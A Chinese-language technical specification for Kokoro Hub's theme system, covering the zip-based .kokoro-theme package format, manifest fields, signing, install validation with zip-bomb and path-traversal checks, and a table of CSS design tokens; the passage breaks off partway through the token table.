# Kokoro 主题 / 皮肤系统规范（THEME-SPEC）

> 适用版本：Hub `>=1.4.0`，文档版本 `spec-1`，与 `PROPOSAL-v1.md` 第八节对应并取代其中所有细节。
> 目标：**用户不改一行代码，就能把 Kokoro 的配色、圆角、间距、字号、图表、页面布局全改掉，并能把自己的作品打包成 `.kokoro-theme` 一键分享给别人。**
>
> 一句话模型：**变量改样式，JSON 改布局，模板改结构（默认不开）。**
> 三层能力从"人人可用"到"高手可用"递进，安全边界也逐层收紧。

---

## 0. 术语与全局约定

| 术语 | 含义 |
|---|---|
| Hub | Kokoro 主控，Go 单二进制，`html/template` 服务端渲染 |
| 主题（theme） | 一个已安装到本 Hub 的 `.kokoro-theme` 包实例，或内置的官方皮肤 |
| 皮肤（skin） | 同"主题"，口语说法，本文统一用"主题" |
| tokens | 第一层：CSS 自定义属性（`--kokoro-*`）的键值集合 |
| layout | 第二层：描述页面结构的 JSON（列表模式、板块顺序、图表参数…） |
| overrides | 第三层：主题自带的 `*.tmpl` 模板片段覆盖，默认关闭 |
| DTO | 传给模板片段的冻结视图模型，只允许基础类型与切片/映射，无方法、无函数字段 |
| 访客 | 匿名浏览者。主题是**全局生效**的，访客与管理员看到同一套皮肤，因此主题的任何注入面都是对访客的攻击面 |

约定：

- 本文所有 CSS 变量名、JSON 字段名一律 ASCII，直引号 `"`，无中文标点。
- 长度类 token 值必须是合法 CSS 长度（`16px` / `1.5rem` / `0`），不接受裸数字（除无单位量如 `opacity`）。
- 颜色类 token 值必须是 `#rgb` / `#rrggbb` / `#rrggbbaa` / `rgb()` / `hsl()` / 关键字 `transparent`，**不接受 `url()`**（背景图走独立字段，见 §3.2 装饰组）。
- 所有未知字段：忽略并记 warning，**不报错**（前向兼容）。未知枚举值：回退到默认值并记 warning。

---

## 1. 目标与非目标

**目标**

1. 开箱有货：内置 5 套官方皮肤，装完就有得玩。
2. 零构建链：主题作者只需要一个文本编辑器 + 系统自带的压缩工具，不需要 Node、不需要 Go。
3. 布局可调：列表页 4 种模式、详情页板块拖拽编排、图表类型/范围/网格/图例可配。
4. 可分享：一键导出自己的（含已改动的）主题，别人一键套用。
5. 打不坏：任何主题出问题都能自动回滚，且永远有一条"无主题"逃生通道。

**非目标**

- 不做在线可视化主题编辑器的富交互（只做表单级编辑 + 实时预览 iframe）。
- 不允许主题携带 JavaScript，永远不允许。
- 不做主题市场账号体系、评分、付费（M4 只做静态索引）。
- 不做运行时 CSS 热重载（改完走一次服务端渲染即可，本来就是 SSR）。

---

## 2. 主题包格式

### 2.1 容器选型：zip（不选 tar.gz）

`PROPOSAL-v1.md` 草案里写的是 tar.gz，本规范改为 **zip**，扩展名固定 `.kokoro-theme`。

| 维度 | zip | tar.gz | 结论 |
|---|---|---|---|
| Go 标准库 | `archive/zip` + `hash/crc32` | `archive/tar` + `compress/gzip` | 平手 |
| 随机访问 | ✅ 有中央目录，可先定位 `theme.json` 读 manifest，校验通过后再落盘 | ❌ 必须顺序流式解包整个归档才能读到 manifest | **决定项**：我们要"先审后装"，未通过校验的包一个字节都不写盘 |
| 条目元信息 | 头部带 `UncompressedSize64` 与 `CRC32`，可在**解压前**判断单文件大小、总大小、压缩比 | 需解压后才知道，zip bomb 只能事后止损 | **决定项**：炸弹防护必须前置 |
| 条目类型 | Go 的 zip Reader 不解释 unix mode，**天然没有 symlink / hardlink 语义** | tar 原生支持 symlink/hardlink/device，逃逸面更大，需额外写 3 类防护 | zip 更安全 |
| 作者体验 | Windows / macOS 资源管理器可直接"压缩"；Linux `zip -r` 一行 | Linux 一行，Windows 要装 7-Zip/Git Bash | zip 更好 |
| 权限位 | 不保留（我们也不需要，落盘统一 `0644` / 目录 `0755`） | 保留（需要显式丢弃，否则可能落盘可执行位） | zip 更好 |
| 流式增量 | 需要 seek，随机访问已覆盖 | 天然流式 | tar 略优，但我们包 ≤8MiB，不构成问题 |
| 体积 | DEFLATE，与 gzip 同级 | 略小 1-3% | 忽略 |

**最终约定**

- 容器：ZIP（DEFLATE 或 STORE 均可），文件名 `*.kokoro-theme`。
- 解压实现要点：
  1. `zip.OpenReader` 后先 `f.Open` 读 `theme.json`（限 1MiB）→ 解析 → 校验 id/版本/兼容范围/checksum/签名。
  2. 全量扫描 `zip.FileHeader`：拒绝 `Mode()&os.ModeType != 0`（非普通文件）、拒绝路径穿越（见 §5.4）、拒绝超限（见 §5.5）。
  3. 校验通过后才建目标目录并逐条 `io.Copy` + `io.LimitReader`。
- 落盘位置：`data/themes/<id>/<version>/`（`data/` 为 Hub 数据目录）。同一 id 多版本共存，便于回滚。

### 2.2 目录结构

```
neon-dream-1.2.0.kokoro-theme          <- 本质是 zip
├── theme.json                          必填。manifest，见 2.3
├── preview.png                         必填。1200x750 PNG/JPEG/WebP，<=300KiB，浅色模式预览
├── preview-dark.png                    可选。深色模式预览，同名规则
├── tokens/
│   ├── light.json                      可选。manifest.tokens 为字符串路径时指向这里
│   └── dark.json                       可选。深色覆盖
├── css/
│   └── custom.css                      可选。补充样式，受 CSS 消毒器约束（见 5.1）
├── assets/                             可选。图片与字体
│   ├── bg/hero.png
│   ├── icons/status-online.svg
│   └── fonts/Inter-Regular.woff2
└── overrides/                          可选。第三层模板片段，默认不启用
    ├── slot-server-card.tmpl
    └── slot-footer.tmpl
```

规则：

| 规则 | 说明 |
|---|---|
| 入口固定 | `theme.json` 必须在包根，且必须在包内存在 |
| 白名单后缀 | `.json .css .png .jpg .jpeg .webp .gif .svg .woff2 .woff .ttf .otf .tmpl .md .txt`；其余条目在安装时丢弃并告警 |
| 无 JS | `.js .mjs .cjs .wasm .html .htm` 一律拒绝，直接判包非法 |
| 路径约束 | 只允许 `[A-Za-z0-9._/-]`，无前导 `/`、无 `./`、`..`、无盘符、无反斜杠、无 NUL 与控制字符 |
| 大小写 | 全部小写目录名（`assets/ css/ tokens/ overrides/`），条目名大小写敏感 |
| 引用方式 | 包内资源在 manifest 中一律写包内相对路径（`assets/bg/hero.png`），运行时由 Hub 重写为 `/_theme-assets/<themeID>/<v>/assets/bg/hero.png` |

### 2.3 `theme.json` 完整字段定义

顶层字段（schemaVersion = 1）：

| 字段 | 类型 | 必填 | 默认值 | 说明 |
|---|---|---|---|---|
| `schemaVersion` | int | ✅ | `1` | manifest 结构版本。Hub 不认识的更高版本 → 拒绝安装并提示升级 Hub |
| `id` | string | ✅ | 无 | 主题唯一 ID。正则 `^[a-z0-9][a-z0-9._-]{2,63}$`。保留前缀 `kokoro.` 仅官方内置可用，社区包使用即拒绝 |
| `name` | string | ✅ | 无 | 展示名，1-60 字符 |
| `version` | string | ✅ | 无 | SemVer 2.0.0（`1.2.0`），不含前导 `v` |
| `description` | string | ❌ | `""` | 一句话简介，≤200 字符，支持纯文本 |
| `author` | string | ✅ | 无 | 作者名或组织，≤80 字符 |
| `homepage` | string(url) | ❌ | `""` | 主题主页 / 仓库地址。必须是 `http(s)`，SSR 渲染成 `rel="nofollow noopener"` |
| `license` | string | ❌ | `"MIT"` | SPDX 标识符（`MIT` / `CC-BY-4.0` / `Apache-2.0` …）。非 SPDX 值记 warning |
| `preview` | string | ✅ | 无 | 包内预览图相对路径（`preview.png`）。必须真实存在于包内且后缀在白名单 |
| `previewDark` | string | ❌ | `""` | 深色模式预览图路径 |
| `tags` | string[] | ❌ | `[]` | 便于索引检索：`["dark","compact","monospace"]`，每个 ≤20 字符，最多 8 个 |
| `compatibility` | object | ✅ | 见下 | 兼容范围，见 2.3.1 |
| `tokensSchemaVersion` | int | ✅ | `2` | 声明本主题按哪一版 CSS 变量命名表编写。Hub 用 `tokensMigrations` 做别名迁移（§8） |
| `tokens` | object \| string | ✅ | 无 | 第一层变量。对象形式直接内联；字符串形式 = 包内 JSON 路径（如 `tokens/light.json`） |
| `tokensDark` | object \| string | ❌ | `{}` | 深色模式覆盖，只需写与 light 不同的键 |
| `mode` | object | ❌ | 见 2.3.2 | 深浅色模式策略 |
| `layoutSchemaVersion` | int | ✅ | `1` | 布局 JSON 结构版本 |
| `layout` | object | ✅ | 无 | 第二层布局描述，见 §3.5 |
| `css` | string[] | ❌ | `[]` | 附加样式表路径（相对包根），按数组顺序注入，通常只写 `["css/custom.css"]` |
| `overrides` | object[] | ❌ | `[]` | 第三层模板覆盖清单，见 2.3.3 |
| `files` | object[] | ❌ | `[]` | 文件清单：`[{"path":"assets/bg/hero.png","sha256":"<hex>","size":12345}]`。提供则逐文件强校验，未提供则只校验 zip CRC32 |
| `checksum` | string | ✅ | 无 | 形如 `sha256:<64 hex>`。计算方式见 2.3.4 |
| `signature` | object \| null | ❌ | `null` | 作者签名，见 2.3.5 |

#### 2.3.1 `compatibility`

| 字段 | 类型 | 必填 | 默认值 | 说明 |
|---|---|---|---|---|
| `kokoro` | string | ✅ | 无 | Hub 版本范围，逗号分隔的 semver 子句：`">=1.4.0 <2.0.0"`、`">=1.4.0"`、`"^1.4"` |
| `minAgent` | string | ❌ | `""` | 仅当主题用到 agent 上报的字段时需要，一般留空 |
| `requireHubFlags` | string[] | ❌ | `[]` | 需要 Hub 开启的实验开关，如 `["template-overrides"]`。未开启则该主题标为 `needs-flags`，不可激活 |

#### 2.3.2 `mode`

| 字段 | 类型 | 必填 | 默认值 | 说明 |
|---|---|---|---|---|
| `default` | enum | ❌ | `"auto"` | `light` / `dark` / `auto`。`auto` 跟随 `prefers-color-scheme` |
| `allowUserSwitch` | bool | ❌ | `true` | 是否显示深浅色切换按钮 |
| `supportsDark` | bool | ❌ | `true` | `false` 时忽略 `tokensDark` 并强制 light（护眼型纸质主题常见） |
| `respectSystemMotion` | bool | ❌ | `true` | 跟随 `prefers-reduced-motion` 关闭动画 |

#### 2.3.3 `overrides[]`

| 字段 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `slot` | string | ✅ | 插槽名，必须在 Hub 白名单内（§4.1），否则整包拒绝 |
| `file` | string | ✅ | 包内 `.tmpl` 路径 |
| `sha256` | string | ✅ | 文件内容摘要，加载时校验 |
| `reason` | string | ❌ | 作者说明为何要覆盖，展示在管理员确认弹窗里 |

#### 2.3.4 `checksum` 计算

```
canonical = JSON 序列化（key 按字典序排序、无缩进、UTF-8、转义非 ASCII），
            并删除顶层 "checksum" 与 "signature" 两个键
checksum  = "sha256:" + hex(sha256(canonical_bytes))
```

实现提示：Go 里用 `json.Marshal` 到 `map[string]any` 即得字典序排序结果；不要依赖结构体字段顺序。

#### 2.3.5 `signature`

```json
"signature": {
  "algorithm": "ed25519",
  "keyId": "kokoro-official-2026",
  "signedAt": "2026-10-05T00:00:00Z",
  "value": "<base64url 无填充，64 字节签名>"
}
```

签名载荷（字节串，UTF-8）：

```
"kokoro-theme/v1\n" + checksum + "\n" + filesRoot
filesRoot = hex(sha256( 按 path 字典序拼接 "path\tsha256\tsize\n" 的所有行 ))
```

`filesRoot` 未在 manifest 提供 `files` 时，用 zip 中央目录的条目列表按同样格式拼（此时只保证结构不保证内容，签名强度降级，UI 标记为"弱签名"）。

信任策略：

| 来源 | 验签 | 未签名时 |
|---|---|---|
| 官方（`id` 前缀 `kokoro.`） | 二进制内置公钥硬编码，必须验过 | 不可能 |
| 社区已信任 key（`data/trusted-theme-keys.json`） | 查 keyId 验签 | 允许安装，UI 打"未签名"黄标，**禁用第三层 overrides** |
| 未知 key | 显示指纹（SHA256 前 16 字节分 4 组），管理员手动勾选"信任此作者"（TOFU） | 同上 |

### 2.4 完整示例 manifest

下面是一个真实可用的社区主题（"霓虹梦"），展示三层能力全部字段：

```json
{
  "schemaVersion": 1,
  "id": "neon-dream",
  "name": "霓虹梦 Neon Dream",
  "version": "1.2.0",
  "description": "深紫底 + 青品红发光，卡片大圆角，适合 3-8 台机器的展示型面板",
  "author": "yifen",
  "homepage": "https://example.com/kokoro/neon-dream",
  "license": "MIT",
  "preview": "preview.png",
  "previewDark": "preview-dark.png",
  "tags": ["dark", "neon", "glow", "card"],
  "compatibility": {
    "kokoro": ">=1.4.0 <2.0.0",
    "requireHubFlags": []
  },
  "tokensSchemaVersion": 2,
  "tokens": {
    "color": {
      "primary": "#7c5cff",
      "primary-hover": "#8f74ff",
      "primary-active": "#6a48f0",
      "primary-fg": "#ffffff",
      "accent": "#22d3ee",
      "accent-fg": "#04121a",
      "success": "#2dd4bf",
      "warning": "#fbbf24",
      "danger": "#fb7185",
      "info": "#38bdf8"
    },
    "surface": {
      "bg": "#0b0714",
      "bg-subtle": "#120c22",
      "surface": "#171029",
      "surface-raised": "#1e1636",
      "surface-sunken": "#0e0a1a",
      "border": "#2c2145",
      "border-strong": "#4a3a75"
    },
    "text": {
      "text": "#ece9f6",
      "text-muted": "#a99fc4",
      "text-faint": "#7a6f96",
      "text-inverse": "#0b0714",
      "link": "#22d3ee"
    },
    "radius": { "sm": "6px", "md": "14px", "lg": "22px", "full": "999px" },
    "space": { "1": "4px", "2": "8px", "3": "12px", "4": "16px", "5": "24px", "6": "32px", "7": "48px", "8": "64px" },
    "stroke": { "border-width": "1px", "ring-width": "3px", "ring-color": "#7c5cff59" },
    "font": {
      "sans": "'Inter', 'PingFang SC', 'Microsoft YaHei', system-ui, sans-serif",
      "mono": "'JetBrains Mono', ui-monospace, 'Cascadia Code', monospace",
      "size-xs": "12px", "size-sm": "13px", "size-md": "14px",
      "size-lg": "16px", "size-xl": "20px", "size-2xl": "26px", "size-3xl": "34px",
      "weight-normal": "400", "weight-medium": "500", "weight-bold": "700",
      "line-height": "1.6", "letter-spacing": "0.01em"
    },
    "effect": {
      "shadow-sm": "0 1px 2px rgba(0,0,0,.5)",
      "shadow-md": "0 8px 24px rgba(124,92,255,.18)",
      "shadow-lg": "0 24px 60px rgba(124,92,255,.28)",
      "glow": "0 0 0 1px #7c5cff40, 0 0 24px #7c5cff33",
      "backdrop-blur": "8px",
      "opacity-disabled": "0.45"
    },
    "motion": {
      "transition-fast": "120ms",
      "transition-base": "220ms",
      "transition-slow": "380ms",
      "easing": "cubic-bezier(.2,.8,.2,1)"
    },
    "chart": {
      "series": ["#22d3ee", "#f472b6", "#a78bfa", "#34d399", "#fbbf24", "#60a5fa", "#fb7185", "#94a3b8"],
      "grid": "#241a3d",
      "axis": "#6b5c92",
      "tooltip-bg": "#1e1636",
      "tooltip-fg": "#ece9f6",
      "area-opacity": "0.22",
      "line-width": "2",
      "point-radius": "2.5",
      "bar-radius": "4"
    },
    "shell": {
      "header-height": "60px",
      "sidebar-width": "248px",
      "content-max-width": "1320px",
      "card-padding": "18px",
      "z-dropdown": "1000",
      "z-modal": "1100",
      "z-toast": "1200"
    },
    "status": {
      "online": "#2dd4bf",
      "offline": "#6b5c92",
      "idle": "#fbbf24",
      "maintenance": "#38bdf8"
    },
    "decor": {
      "bg-image": "assets/bg/noise.png",
      "bg-size": "auto",
      "bg-repeat": "repeat",
      "bg-attachment": "fixed",
      "hero-gradient": "linear-gradient(135deg, #7c5cff 0%, #22d3ee 100%)",
      "hero-overlay": "rgba(11,7,20,.45)",
      "card-border-image": "none"
    }
  },
  "tokensDark": {
    "surface": { "bg": "#080611", "surface": "#120d20" },
    "decor": { "bg-image": "assets/bg/noise-dark.png" }
  },
  "mode": { "default": "dark", "allowUserSwitch": true, "supportsDark": true },
  "layoutSchemaVersion": 1,
  "layout": {
    "shell": {
      "contentMaxWidth": "var(--kokoro-content-max-width)",
      "contentAlign": "center",
      "header": { "enabled": true, "variant": "blur", "sticky": true, "height": "var(--kokoro-header-height)", "showSearch": true, "showModeSwitch": true },
      "sidebar": { "enabled": true, "position": "left", "width": "var(--kokoro-sidebar-width)", "collapsible": true, "defaultCollapsed": false, "sticky": true },
      "nav": {
        "items": [
          { "id": "home", "label": "总览", "href": "/", "icon": "grid", "order": 0, "visible": true },
          { "id": "map", "label": "地区", "href": "/regions", "icon": "globe", "order": 1, "visible": true },
          { "id": "docs", "label": "文档", "href": "/docs", "icon": "book", "order": 2, "visible": false },
          { "id": "theme", "label": "皮肤", "href": "/themes", "icon": "palette", "order": 3, "visible": true }
        ]
      },
      "footer": {
        "enabled": true,
        "variant": "columns",
        "showVersion": true,
        "text": "Powered by Kokoro",
        "columns": [
          { "title": "关于", "links": [{ "label": "项目主页", "href": "https://example.com" }, { "label": "状态页", "href": "/status" }] },
          { "title": "联络", "links": [{ "label": "TG", "href": "https://t.me/example" }] }
        ]
      }
    },
    "home": {
      "hero": {
        "enabled": true,
        "variant": "gradient",
        "align": "center",
        "height": "38vh",
        "minHeight": "260px",
        "title": "我的小鸡农场",
        "subtitle": "8 台机器 · 6 个机房 · 全年在线率 99.7%",
        "background": {
          "type": "gradient",
          "value": "var(--kokoro-hero-gradient)",
          "image": "assets/bg/hero.png",
          "overlay": "var(--kokoro-hero-overlay)",
          "blur": "0px"
        },
        "showStats": true,
        "stats": [
          { "key": "total", "label": "机器总数" },
          { "key": "online", "label": "在线" },
          { "key": "avgLoad", "label": "平均负载" }
        ],
        "cta": [{ "label": "加入节点", "href": "/docs/join", "style": "primary" }]
      },
      "list": {
        "mode": "card",
        "allowUserSwitch": true,
        "availableModes": ["card", "table", "compact", "map"],
        "defaultSort": { "by": "name", "order": "asc" },
        "groupBy": "none",
        "showFilterBar": true,
        "filterFields": ["status", "region", "tag"],
        "emptyState": { "title": "还没有机器", "text": "去后台添加第一台吧", "icon": "server" },
        "card": {
          "minWidth": "320px",
          "maxWidth": "1fr",
          "gap": "var(--kokoro-space-5)",
          "aspect": "16 / 9",
          "align": "left",
          "border": true,
          "shadow": "md",
          "hoverLift": true,
          "coverFit": "cover",
          "fields": ["cover", "flag", "name", "status", "location", "os", "cpu", "mem", "disk", "net", "uptime", "tags", "sparkline"],
          "sparkline": { "enabled": true, "metric": "cpu", "range": "1h", "height": "34px" }
        },
        "table": {
          "density": "compact",
          "striped": true,
          "rowHover": true,
          "stickyHeader": true,
          "showUnit": true,
          "columns": ["name", "status", "location", "cpu", "mem", "disk", "net", "uptime"]
        },
        "compact": {
          "rowHeight": "46px",
          "dividers": true,
          "showFlag": true,
          "inlineBars": true,
          "fields": ["flag", "name", "status", "cpu", "mem", "net"]
        },
        "map": {
          "groupBy": "region",
          "showLabels": true,
          "colorBy": "load",
          "emptyRegion": "hide",
          "projection": "equirectangular",
          "height": "440px"
        }
      }
    },
    "detail": {
      "header": {
        "variant": "hero",
        "height": "340px",
        "align": "left",
        "showStatusBadge": true,
        "showFlag": true,
        "showTags": true,
        "overlay": "var(--kokoro-hero-overlay)",
        "background": { "type": "gradient", "value": "var(--kokoro-hero-gradient)", "image": "", "blur": "0px" },
        "primaryLine": "name",
        "secondaryLine": "location"
      },
      "sections": [
        { "id": "metrics", "type": "metrics", "title": "实时负载", "visible": true, "span": "full", "locked": false },
        { "id": "intro", "type": "intro", "title": "机器介绍", "visible": true, "span": "full", "locked": false },
        { "id": "gallery", "type": "gallery", "title": "相册", "visible": true, "span": "full", "locked": false, "options": { "columns": 3, "aspect": "4 / 3", "lightbox": true } },
        { "id": "comments", "type": "comments", "title": "留言", "visible": true, "span": "full", "locked": false, "options": { "perPage": 20, "order": "newest" } },
        { "id": "commerce", "type": "commerce", "title": "交易意向", "visible": true, "span": "sidebar", "locked": false, "options": { "buttonLabel": "我想接手" } },
        { "id": "specs", "type": "specs", "title": "配置参数", "visible": false, "span": "sidebar", "locked": false }
      ],
      "sectionGap": "var(--kokoro-space-6)",
      "sidebarPosition": "right",
      "stickySidebar": true
    },
    "charts": {
      "type": "area",
      "types": ["line", "area", "bar"],
      "typeAllowUserSwitch": true,
      "defaultRange": "6h",
      "ranges": [
        { "key": "1h", "label": "1 小时", "points": 120 },
        { "key": "6h", "label": "6 小时", "points": 180 },
        { "key": "24h", "label": "24 小时", "points": 240 },
        { "key": "7d", "label": "7 天", "points": 240 },
        { "key": "30d", "label": "30 天", "points": 240 }
      ],
      "grid": true,
      "legend": true,
      "axisLabel": true,
      "stack": false,
      "smooth": true,
      "tooltip": "axis",
      "height": "220px",
      "heightDetail": "320px",
      "animationMs": "220"
    },
    "misc": {
      "statusDotStyle": "glow",
      "usageBarStyle": "gradient",
      "tagStyle": "pill",
      "badgeStyle": "soft",
      "showUptime": true,
      "showRegionFlag": true,
      "numberFormat": "si",
      "dateFormat": "relative"
    }
  },
  "css": ["css/custom.css"],
  "overrides": [
    { "slot": "slot-server-card", "file": "overrides/slot-server-card.tmpl", "sha256": "3f1b...e9", "reason": "卡片封面加渐变描边" }
  ],
  "files": [
    { "path": "preview.png", "sha256": "a1b2...cd", "size": 218455 },
    { "path": "css/custom.css", "sha256": "9f0a...11", "size": 4211 }
  ],
  "checksum": "sha256:7d4e...c0",
  "signature": {
    "algorithm": "ed25519",
    "keyId": "yifen-2026",
    "signedAt": "2026-10-05T10:00:00Z",
    "value": "MEUCIQ..."
  }
}
```

### 2.5 安装校验流程（顺序不可颠倒）

```
1. 读 zip 中央目录 → 条目数 <= 300？单条 UncompressedSize <= 1MiB？总和 <= 8MiB？否则拒绝
2. 定位 theme.json（<= 1MiB）→ 解析 JSON → schemaVersion 已知？
3. id 合法且不撞保留前缀？version 合法 semver？
4. checksum 重算比对（canonical 序列化）→ 不匹配直接拒绝
5. compatibility.kokoro 与当前 Hub 版本比对 → 不在范围内则标 incompatible（可强制安装，但激活时二次确认）
6. files[] 与 zip 中央目录交叉比对（多文件 / 缺文件 / 大小不符 → 拒绝）
7. 逐条路径安全扫描（穿越 / 类型 / 后缀白名单 / 无 JS）
8. 验签（有则验，无则标 unsigned）
9. 落盘到临时目录 data/themes/.staging/<uuid>/
10. 逐文件 sha256 校验（若提供 files[]）→ CSS 消毒（css/*.css）→ 模板 AST 静态检查（overrides/*.tmpl）
11. 原子 rename 到 data/themes/<id>/<version>/
12. 写入 DB themes 表，状态 staged，返回摘要给前端
```

任一步失败 → 删除临时目录，返回结构化错误 `{code, field, message}`，**不留下半成品**。

---

## 3. 双层定制模型

### 3.1 总览

```
用户感知             实现方式                        谁产出
─────────────────────────────────────────────────────────
第一层 样式  →  CSS 自定义属性 --kokoro-*      →  manifest.tokens (+ tokensDark)
第二层 布局  →  JSON → 页面 data-k-* 属性      →  manifest.layout
                        + Hub 内置 CSS 规则表
第三层 结构  →  html/template 片段覆盖         →  overrides/*.tmpl（默认关）
```

关键点：**第二层不靠主题写 CSS 实现布局，而是靠 Hub 预置的 `data-k-*` 属性 + 内置 CSS 规则组合**。主题作者只选值，Hub 负责所有响应式/无障碍/边界情况。这样：

- 主题作者不需要懂 CSS 布局；
- Hub 升级改了 DOM 结构，主题不会崩（属性名是稳定契约）；
- 布局能力可以被安全审计（只有有限的枚举值）。

### 3.2 第一层：tokens（CSS 自定义属性命名表）

命名空间统一 `--kokoro-<group>-<name>`。Hub 注入到 `<style id="kokoro-tokens" nonce="...">`，选择器为 `:root`（浅色）与 `[data-k-mode="dark"]`（深色）。

**主题自带的 `css/custom.css` 中禁止出现 `:root`、`html`、`body` 选择器，禁止声明任何 `--kokoro-*` 变量**——变量只能在 tokens JSON 里声明，由 Hub 统一注入。这条硬约束同时保证：变量可被枚举、可被导出、可被别名迁移、不会被暗中篡改。

以下为 `tokensSchemaVersion = 2` 的完整命名表（共 78 个变量，远超最低要求；表中"默认值"= 内置 `kokoro.daylight` 皮肤）。

#### A. 品牌与语义色 `color`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-color-primary` | color | `#2f6feb` | 主色：按钮、链接激活、进度条 |
| `--kokoro-color-primary-hover` | color | `#2a61d0` | 主色悬停 |
| `--kokoro-color-primary-active` | color | `#2455b8` | 主色按下 |
| `--kokoro-color-primary-fg` | color | `#ffffff` | 主色之上的文字色 |
| `--kokoro-color-accent` | color | `#7c5cff` | 强调色：徽章、图表点缀、Hero |
| `--kokoro-color-accent-fg` | color | `#ffffff` | 强调色之上的文字 |
| `--kokoro-color-success` | color | `#1a7f37` | 成功 / 在线 |
| `--kokoro-color-warning` | color | `#bf6a02` | 警告 / 高负载 |
| `--kokoro-color-danger` | color | `#cf222e` | 危险 / 离线 |
| `--kokoro-color-info` | color | `#0969da` | 提示信息 |

#### B. 表面与背景 `surface`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-color-bg` | color | `#ffffff` | 页面最底层背景 |
| `--kokoro-color-bg-subtle` | color | `#f6f8fa` | 分区交替背景 |
| `--kokoro-color-surface` | color | `#ffffff` | 卡片 / 面板背景 |
| `--kokoro-color-surface-raised` | color | `#ffffff` | 弹层、下拉菜单背景 |
| `--kokoro-color-surface-sunken` | color | `#f6f8fa` | 内凹区域（代码块、输入框） |
| `--kokoro-color-border` | color | `#d0d7de` | 常规描边 |
| `--kokoro-color-border-strong` | color | `#8c959f` | 强调描边、分隔线 |

#### C. 文本 `text`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-color-text` | color | `#1f2328` | 正文 |
| `--kokoro-color-text-muted` | color | `#59636e` | 次要文字 |
| `--kokoro-color-text-faint` | color | `#818b98` | 辅助文字、时间戳 |
| `--kokoro-color-text-inverse` | color | `#ffffff` | 深底上的文字 |
| `--kokoro-color-link` | color | `#0969da` | 链接 |

#### D. 圆角 `radius`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-radius-sm` | length | `4px` | 标签、徽章、小按钮 |
| `--kokoro-radius-md` | length | `8px` | 卡片、输入框 |
| `--kokoro-radius-lg` | length | `12px` | 大容器、弹窗 |
| `--kokoro-radius-full` | length | `999px` | 药丸、状态点 |

#### E. 间距 `space`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-space-1` | length | `4px` | |
| `--kokoro-space-2` | length | `8px` | |
| `--kokoro-space-3` | length | `12px` | |
| `--kokoro-space-4` | length | `16px` | 卡片内边距基准 |
| `--kokoro-space-5` | length | `24px` | |
| `--kokoro-space-6` | length | `32px` | |
| `--kokoro-space-7` | length | `48px` | |
| `--kokoro-space-8` | length | `64px` | |

#### F. 描边与焦点 `stroke`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-border-width` | length | `1px` | 全局描边粗细 |
| `--kokoro-ring-width` | length | `3px` | 焦点环粗细 |
| `--kokoro-ring-color` | color | `#2f6feb59` | 焦点环颜色（带透明度） |

#### G. 字体 `font`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-font-sans` | font-stack | `system-ui, -apple-system, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif` | 正文西文在前、中文兜底 |
| `--kokoro-font-mono` | font-stack | `ui-monospace, 'Cascadia Code', 'JetBrains Mono', Consolas, monospace` | 数字、指标、代码块 |
| `--kokoro-font-size-xs` | length | `12px` | |
| `--kokoro-font-size-sm` | length | `13px` | |
| `--kokoro-font-size-md` | length | `14px` | 正文 |
| `--kokoro-font-size-lg` | length | `16px` | |
| `--kokoro-font-size-xl` | length | `20px` | |
| `--kokoro-font-size-2xl` | length | `26px` | |
| `--kokoro-font-size-3xl` | length | `34px` | Hero 标题 |
| `--kokoro-font-weight-normal` | number | `400` | |
| `--kokoro-font-weight-medium` | number | `500` | |
| `--kokoro-font-weight-bold` | number | `700` | |
| `--kokoro-line-height` | number | `1.55` | |
| `--kokoro-letter-spacing` | length | `0` | |

#### H. 阴影与效果 `effect`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-shadow-sm` | shadow | `0 1px 2px rgba(31,35,40,.08)` | 卡片静息 |
| `--kokoro-shadow-md` | shadow | `0 4px 12px rgba(31,35,40,.10)` | 卡片悬停 |
| `--kokoro-shadow-lg` | shadow | `0 16px 40px rgba(31,35,40,.16)` | 弹窗 |
| `--kokoro-glow` | shadow | `none` | 可选发光（`none` 表示不启用） |
| `--kokoro-backdrop-blur` | length | `0px` | 毛玻璃强度，`0px` 关闭 |
| `--kokoro-opacity-disabled` | number | `0.5` | 禁用态透明度 |

#### I. 动效 `motion`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-transition-fast` | time | `120ms` | 颜色/透明度 |
| `--kokoro-transition-base` | time | `200ms` | 常规 |
| `--kokoro-transition-slow` | time | `320ms` | 位移/展开 |
| `--kokoro-easing` | easing | `cubic-bezier(.2,0,0,1)` | 缓动曲线 |

#### J. 图表 `chart`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-chart-series-1` | color | `#2f6feb` | CPU |
| `--kokoro-chart-series-2` | color | `#7c5cff` | 内存 |
| `--kokoro-chart-series-3` | color | `#1a7f37` | 磁盘 |
| `--kokoro-chart-series-4` | color | `#bf6a02` | 上行 |
| `--kokoro-chart-series-5` | color | `#cf222e` | 下行 |
| `--kokoro-chart-series-6` | color | `#0969da` | 预留 |
| `--kokoro-chart-series-7` | color | `#8250df` | 预留 |
| `--kokoro-chart-series-8` | color | `#6e7781` | 预留 |
| `--kokoro-chart-grid` | color | `#eaeef2` | 网格线 |
| `--kokoro-chart-axis` | color | `#8c959f` | 坐标轴文字与轴线 |
| `--kokoro-chart-tooltip-bg` | color | `#1f2328` | 提示框背景 |
| `--kokoro-chart-tooltip-fg` | color | `#ffffff` | 提示框文字 |
| `--kokoro-chart-area-opacity` | number | `0.18` | 面积图填充透明度 |
| `--kokoro-chart-line-width` | number | `1.75` | 折线宽度（px） |
| `--kokoro-chart-point-radius` | number | `2.5` | 数据点半径 |
| `--kokoro-chart-bar-radius` | number | `3` | 柱子圆角 |

#### K. 骨架尺寸 `shell`

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-header-height` | length | `56px` | 顶栏高度 |
| `--kokoro-sidebar-width` | length | `240px` | 侧边栏宽度 |
| `--kokoro-content-max-width` | length | `1280px` | 内容区最大宽度 |
